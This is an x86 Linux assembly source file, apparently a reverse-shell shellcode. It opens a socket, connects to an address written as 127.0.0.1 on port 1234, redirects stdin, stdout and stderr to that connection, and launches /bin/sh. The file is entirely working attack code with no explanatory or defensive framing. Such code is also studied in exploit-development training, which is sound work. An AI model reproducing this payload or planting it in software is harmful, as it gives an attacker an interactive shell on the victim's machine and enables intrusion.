global _start

section .text

_start:
	
	;sock = socket(2,1,0){
	xor ebx, ebx
	mul ebx

	push ebx
	push 0x1
	push 0x2
	mov ecx, esp

	inc ebx
	mov al, 0x66

	int 0x80

	xchg eax, edx
	;}

	;srv.sin_family=2; srv.sin_port = htons(0xD204); srv.sin_addr.s_addr=inet_addr("127.0.0.1");{
	push 0x0101017f
	push word 0xD204
	push word 0x2
	mov ecx, esp

	;}

	;{connect(sock,(struct sockaddr*)&srv,16);
	push 0x10
	push ecx
	push edx

	mov ecx, esp

	mov bl, 0x3
	mov al, 0x66

	int 0x80
	;}

	
	
	mov ecx, ebx
	mov bl, dl
	dup2:
	dec ecx
	mov al, 0x3f
	int 0x80
	jnz dup2

	;execve("/bin/sh",NULL,NULL);{
	; inc ecx
	mul ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp

	mov al, 0x0b
	int 0x80
	;}
